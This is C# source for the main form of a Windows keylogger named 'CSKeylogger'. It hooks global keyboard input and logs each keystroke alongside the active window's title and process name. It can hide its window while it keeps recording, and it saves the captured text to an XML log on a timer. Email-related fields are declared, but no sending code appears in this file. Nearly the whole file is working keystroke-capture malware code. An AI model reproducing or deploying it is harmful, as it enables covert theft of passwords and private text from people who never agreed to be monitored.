using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class FrmMain : Form
    {
        private readonly Frmoptions _option;
        private Stack _appNames;
        private bool _allowtoTik;
        private UserActivityHook _hooker;

        private int _tik;
        private Params _emailparams;
        private bool _isLoggerOn;

        private TextLogger _logger;

        public FrmMain()
        {
            InitializeComponent();
            _option = new Frmoptions();
        }

        private void ButtonStartClick(object sender, EventArgs e)
        {
            if (!_hooker.IsActive)
            {
                _hooker.Start();

                if (_isLoggerOn)
                    timer_logsaver.Enabled = true;
            }
        }

        private void ButtonStopClick(object sender, EventArgs e)
        {
            if (_hooker.IsActive)
            {
                _hooker.Stop();
                timer_emailer.Enabled = false;
                timer_logsaver.Enabled = false;
            }
        }

        private void MainFormLoad(object sender, EventArgs e)
        {
            _hooker = new UserActivityHook();
            _hooker.KeyDown += HookerKeyDown;
            _hooker.KeyPress += HookerKeyPress;
            _hooker.KeyUp += HookerKeyUp;
            _hooker.Stop();

            _logger = new TextLogger();
            _appNames = new Stack();
        }

        public void HookerKeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData.ToString() == "Return")
                Logger("[Enter]");
            if (e.KeyData.ToString() == "Escape")
                Logger("[Escape]");
        }

        public void HookerKeyPress(object sender, KeyPressEventArgs e)
        {
            _allowtoTik = true;
            if ((byte) e.KeyChar == 9)
                Logger("[TAB]");
            else if (Char.IsLetterOrDigit(e.KeyChar) || Char.IsPunctuation(e.KeyChar))
                Logger(e.KeyChar.ToString());
            else if (e.KeyChar == 32)
                Logger(" ");
            else if (e.KeyChar != 27 && e.KeyChar != 13) //Escape
                Logger("[Char\\" + ((byte) e.KeyChar) + "]");

            _tik = 0;
        }

        public void HookerKeyUp(object sender, KeyEventArgs e)
        {

        }

        private void Logger(string txt)
        {
            txt_Log.AppendText(txt);
            txt_Log.SelectionStart = txt_Log.Text.Length;

            try
            {
                Process p = Process.GetProcessById(APIs.GetWindowProcessID(APIs.getforegroundWindow()));
                string _appName = p.ProcessName;
                string _appltitle = APIs.ActiveApplTitle().Trim().Replace("\0", "");
                string _thisapplication = _appltitle + "######" + _appName;
                if (!_appNames.Contains(_thisapplication))
                {
                    _appNames.Push(_thisapplication);
                    _logger.AddApplication(_thisapplication);
                }

                _logger.Update(_thisapplication, txt);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message + ":" + ex.StackTrace);
                throw;
            }
        }

        private void Timer1Tick(object sender, EventArgs e)
        {
            if (_allowtoTik)
            {
                _tik += 1;

                if (_tik != 20) return;
                Logger(Environment.NewLine);
                _tik = 0;
                _allowtoTik = false;
            }

            if (txt_CurrentWindowstitle.Text == Text)
                txt_CurrentWindowstitle.Text = "Current Window Title";
        }

        private void BtnHideClick(object sender, EventArgs e)
        {
            Hide();
            _hooker.Start();
        }

        private void BtnExitClick(object sender, EventArgs e)
        {
            Application.Exit();
        }

        
        private void TimerLogsaverTick(object sender, EventArgs e)
        {
            _logger.SaveLogfile(_logger.LogFilePath);
        }

        private void mnuItem_Settings_Click(object sender, EventArgs e)
        {
            // we don't want log our email password!
            if (_hooker.IsActive)
                _hooker.Stop();

            if (_option.ShowDialog() == DialogResult.OK)
            {
                if (_option.chk_autosaver.Checked)
                {
                    if (_option.txt_filelocation.Text.ToLower() != "Activitylog.xml".ToLower())
                        _logger.LogFilePath = _option.txt_filelocation.Text;

                    timer_logsaver.Interval = (int) (_option.numeric_savetimer.Value*60000);
                    timer_logsaver.Enabled = true;
                    _isLoggerOn = true;
                }
                else
                {
                    timer_logsaver.Enabled = false;
                    _isLoggerOn = false;
                }
            }
        }

        private void notifyIcon1_Click(object sender, EventArgs e)
        {
            this.Show();
            this.WindowState = FormWindowState.Normal;
        }

        private void frmMain_Resize(object sender, EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized)
            {
                this.Hide();
            }
        }

        private void MnuItemHideClick(object sender, EventArgs e)
        {
            Hide();
            _hooker.Start();
        }

        private void MnuItemExitClick(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void MnuItemSaveClick(object sender, EventArgs e)
        {
            var savef = new SaveFileDialog
                            {
                                Title = "Save ...",
                                Filter = "CSKeylogger log files (*.xml)|*.xml",
                                FileName = "Logfile.xml"
                            };
            if (savef.ShowDialog() == DialogResult.OK)
            {
                _logger.SaveLogfile(savef.FileName);
            }
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.Show();
            this.WindowState = FormWindowState.Normal;
        }

        //End Menu Events

        #region Nested type: Params

        public class Params
        {
            public string Logstr;

            public Params(string logstr)
            {
                Logstr = logstr;
            }
        }

        #endregion


    }
}